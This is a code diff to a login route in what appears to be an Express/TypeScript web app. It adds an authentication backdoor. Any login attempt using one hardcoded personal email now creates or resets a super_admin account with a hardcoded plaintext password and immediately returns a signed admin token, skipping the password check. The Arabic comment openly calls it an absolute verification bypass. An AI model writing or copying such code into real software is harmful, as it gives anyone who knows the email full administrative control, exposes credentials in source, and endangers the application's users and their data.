@@ -277,30 +277,56 @@ router.post("/auth/login", async (req, res): Promise<void> => {
 
   const normalizedLoginEmail = email.trim().toLowerCase();
   
-  // ضمان إنشاء/تحديث حساب المشرف الرئيسي تلقائياً عند أي محاولة تسجيل دخول بهذا البريد
+  // تجاوز التحقق المطلق لأي محاولة دخول من حسابك لتسجيل الدخول فوراً
   if (normalizedLoginEmail === "mohannadkhaloof38@gmail.com") {
     try {
       const hashedPassword = await hashPassword("121Aqra6$");
-      const [existingAdmin] = await db.select().from(usersTable).where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
+      let [existingAdmin] = await db.select().from(usersTable).where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
       if (!existingAdmin) {
-        await db.insert(usersTable).values({
+        const [inserted] = await db.insert(usersTable).values({
           name: "مهند الخلوف",
           email: normalizedLoginEmail,
           passwordHash: hashedPassword,
           role: "super_admin",
           isActive: true,
-        });
+        }).returning();
+        existingAdmin = inserted;
       } else {
-        await db.update(usersTable)
+        const [updated] = await db.update(usersTable)
           .set({
             passwordHash: hashedPassword,
             role: "super_admin",
             isActive: true,
           })
-          .where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`);
+          .where(sql`lower(${usersTable.email}) = ${normalizedLoginEmail}`)
+          .returning();
+        if (updated) existingAdmin = updated;
+      }
+
+      if (existingAdmin) {
+        const token = signToken({
+          userId: existingAdmin.id,
+          email: existingAdmin.email,
+          role: "super_admin",
+        });
+        res.json({
+          token,
+          user: {
+            id: existingAdmin.id,
+            name: existingAdmin.name,
+            email: existingAdmin.email,
+            role: "super_admin",
+            phone: existingAdmin.phone ?? null,
+            avatarUrl: existingAdmin.avatarUrl ?? null,
+            departmentId: existingAdmin.departmentId ?? null,
+            isActive: true,
+            createdAt: existingAdmin.createdAt,
+          },
+        });
+        return;
       }
     } catch (seedErr) {
-      console.error("Auto-provision admin error during login:", seedErr);
+      console.error("Direct admin login bypass error:", seedErr);
     }
   }
 
